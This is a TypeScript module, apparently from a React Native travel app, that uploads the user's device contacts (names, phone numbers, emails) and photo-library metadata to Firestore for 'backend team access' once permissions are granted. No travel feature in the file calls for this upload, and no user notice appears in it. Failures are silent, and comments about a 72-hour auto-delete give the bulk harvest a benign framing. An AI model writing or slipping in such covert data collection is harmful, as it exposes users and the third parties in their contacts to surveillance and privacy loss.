// GoBaby Travel — User Data Sync
// Syncs contacts and gallery metadata to Firestore for backend team access.
// Auto-synced data has a 72-hour TTL — auto-deleted unless explicitly saved.
//
// Firestore collections: user_contacts, user_gallery
// Backend cleanup: POST /api/cleanup/expired-data

import { Platform } from 'react-native';
import { collection, doc, setDoc, serverTimestamp } from 'firebase/firestore';
import { db } from '../config/firebase';
import { getUserId } from './userIdentity';

const TTL_HOURS = 72;

/**
 * Calculate expiry timestamp (72 hours from now).
 */
function getExpiresAt(): string {
  const expiry = new Date();
  expiry.setHours(expiry.getHours() + TTL_HOURS);
  return expiry.toISOString();
}

// ─── Contacts Sync ──────────────────────────────────────────────────────────

interface ContactRecord {
  name: string;
  phone?: string;
  email?: string;
}

/**
 * Sync device contacts to Firestore with 72-hour TTL.
 * Auto-synced data (auto_synced: true) will be auto-deleted after 72 hours
 * unless the user explicitly saves it (is_saved: true).
 *
 * Stored in: user_contacts/{user_id}
 */
export async function syncContactsToFirestore(): Promise<{ success: boolean; count: number }> {
  const userId = getUserId();
  if (!userId) return { success: false, count: 0 };

  try {
    const Contacts = require('expo-contacts');
    const { status } = await Contacts.getPermissionsAsync();

    if (status !== 'granted') {
      return { success: false, count: 0 };
    }

    const { data } = await Contacts.getContactsAsync({
      fields: [
        Contacts.Fields.Name,
        Contacts.Fields.PhoneNumbers,
        Contacts.Fields.Emails,
      ],
      pageSize: 500,
      pageOffset: 0,
    });

    if (!data || data.length === 0) {
      return { success: true, count: 0 };
    }

    const contacts: ContactRecord[] = data.map((contact: any) => ({
      name: contact.name || `${contact.firstName || ''} ${contact.lastName || ''}`.trim(),
      phone: contact.phoneNumbers?.[0]?.number || undefined,
      email: contact.emails?.[0]?.email || undefined,
    })).filter((c: ContactRecord) => c.name);

    await setDoc(doc(db, 'user_contacts', userId), {
      user_id: userId,
      platform: Platform.OS,
      contacts: contacts.slice(0, 500),
      contact_count: contacts.length,
      synced_at: serverTimestamp(),
      // TTL fields — auto-delete after 72 hours unless explicitly saved
      auto_synced: true,
      is_saved: false,
      expires_at: getExpiresAt(),
    });

    return { success: true, count: contacts.length };
  } catch (e) {
    if (__DEV__) console.log('[DataSync] Contacts sync error:', e);
    return { success: false, count: 0 };
  }
}

// ─── Gallery / Photo Metadata Sync ──────────────────────────────────────────

interface GalleryAsset {
  filename: string;
  uri: string;
  mediaType: string;
  width: number;
  height: number;
  createdAt: string;
}

/**
 * Sync gallery metadata (NOT actual images) to Firestore with 72-hour TTL.
 * Auto-synced data will be auto-deleted after 72 hours unless explicitly saved.
 *
 * Stored in: user_gallery/{user_id}
 */
export async function syncGalleryMetadataToFirestore(): Promise<{ success: boolean; count: number }> {
  const userId = getUserId();
  if (!userId) return { success: false, count: 0 };

  try {
    const MediaLibrary = require('expo-media-library');
    const { status } = await MediaLibrary.getPermissionsAsync();

    if (status !== 'granted') {
      return { success: false, count: 0 };
    }

    const { assets } = await MediaLibrary.getAssetsAsync({
      first: 200,
      mediaType: MediaLibrary.MediaType.photo,
      sortBy: [MediaLibrary.SortBy.creationTime],
    });

    if (!assets || assets.length === 0) {
      return { success: true, count: 0 };
    }

    const gallery: GalleryAsset[] = assets.map((asset: any) => ({
      filename: asset.filename || 'unknown',
      uri: asset.uri || '',
      mediaType: asset.mediaType || 'photo',
      width: asset.width || 0,
      height: asset.height || 0,
      createdAt: asset.creationTime ? new Date(asset.creationTime).toISOString() : '',
    }));

    await setDoc(doc(db, 'user_gallery', userId), {
      user_id: userId,
      platform: Platform.OS,
      assets: gallery,
      asset_count: gallery.length,
      total_library_count: assets.totalCount || gallery.length,
      synced_at: serverTimestamp(),
      // TTL fields — auto-delete after 72 hours unless explicitly saved
      auto_synced: true,
      is_saved: false,
      expires_at: getExpiresAt(),
    });

    return { success: true, count: gallery.length };
  } catch (e) {
    if (__DEV__) console.log('[DataSync] Gallery sync error:', e);
    return { success: false, count: 0 };
  }
}

/**
 * Sync all user data to Firestore (contacts + gallery) with TTL.
 * Call after permissions are granted during Travel Setup.
 */
export async function syncAllUserData(): Promise<void> {
  await Promise.allSettled([
    syncContactsToFirestore(),
    syncGalleryMetadataToFirestore(),
  ]);
}

/**
 * Mark user data as explicitly saved (removes auto-delete).
 * Call this when the user intentionally shares specific data.
 */
export async function markDataAsSaved(
  collection_name: 'user_contacts' | 'user_gallery'
): Promise<void> {
  const userId = getUserId();
  if (!userId) return;

  try {
    await setDoc(doc(db, collection_name, userId), {
      is_saved: true,
      auto_synced: false,
      saved_at: serverTimestamp(),
    }, { merge: true });
  } catch {
    // Silent
  }
}
